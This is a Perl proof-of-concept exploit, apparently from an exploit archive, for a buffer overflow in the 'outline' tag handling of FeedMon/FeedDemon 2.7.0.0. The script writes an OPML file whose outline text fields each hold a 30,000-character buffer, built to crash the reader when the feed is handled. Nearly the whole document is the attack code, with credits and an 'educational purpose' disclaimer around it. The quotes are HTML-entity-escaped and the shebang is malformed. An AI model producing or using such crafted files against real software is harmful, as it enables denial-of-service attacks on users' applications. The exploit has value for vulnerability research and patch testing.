FeedMon 2.7.0.0 outline Tag Buffer Overflow Exploit PoC
=======================================================




#!usr/bin/perl -w

################################################################################
#     Reference:
#        http://security.bkis.vn/?p=329
#        http://www.securityfocus.com/bid/33630/info
#
#    Tested on Windows Server 2003 with FeedMon 2.7.0.0. FeedMon crashes
#    whenever I am trying to Unsubscribe from the malicious(overlylong) feed.
#
#     Thanx to milw0rm, str0ke, security.bkis, @rp m@n, evilfingers
#    and all security researchers.
#
#$$$$$ This was strictly written for educational purpose. Use it at
#$$$$$ your own risk. Author will not bare any responsibility for any
#$$$$$ damages watsoever.
#
#####MOST OF THE CODE I GOT FROM###############################################
#####http://search.cpan.org/~madghoul/XML-OPML-0.26/OPML.pm####################
#
#    Author: Praveen Dar$hanam
#    Visit:
#        http://www.darshanams.blogspot.com/
#        http://www.evilfingers.com/
################################################################################

use XML::OPML;
print "OPML is working fine\n\n";

 my $opml = new XML::OPML(version => "1.1");

 $opml->head(
             title => &#039;FeedDemon \&#039;outline\&#039; Tag Buffer Overflow Vulnerability PoC&#039;,
             dateCreated => &#039;Thur, 05 Feb 2009 8.55:35:00 IST&#039;,
             ownerName => &#039;Praveen Darshanam&#039;,
             ownerEmail => &#039;praveen_recker@sify.com&#039;,
             expansionState => &#039;&#039;,
             vertScrollState => &#039;&#039;,
             windowTop => &#039;&#039;,
             windowLeft => &#039;&#039;,
             windowBottom => &#039;&#039;,
             windowRight => &#039;&#039;,
           );

 $buff="D" x 30000;
 # Malicious buffer which creates overly long text tag

 $opml->add_outline(
                 description => &#039;Warren Ellis\&#039; Personal Weblog&#039;,
                 title => &#039;Warren Ellis Speaks Clever&#039;,
                 text => $buff,
                 type => &#039;rss&#039;,
                 version => &#039;RSS&#039;,
                 htmlUrl => &#039;http://www.diepunyhumans.com &#039;,
                 xmlUrl => &#039;http://www.diepunyhumans.com/index.rdf &#039;,
               );

 $opml->add_outline(
                 descriptions => &#039;The raelity bytes weblog.&#039;,
                 title => &#039;raelity bytes&#039;,
                 text => $buff,
                 type => &#039;rss&#039;,
                 version => &#039;RSS&#039;,
                 htmlUrl => &#039;http://www.raelity.org &#039;,
                 xmlUrl => &#039;http://www.raelity.org/index.rss10 &#039;,
               );

 $opml->save(&#039;malicious_files.opml&#039;);



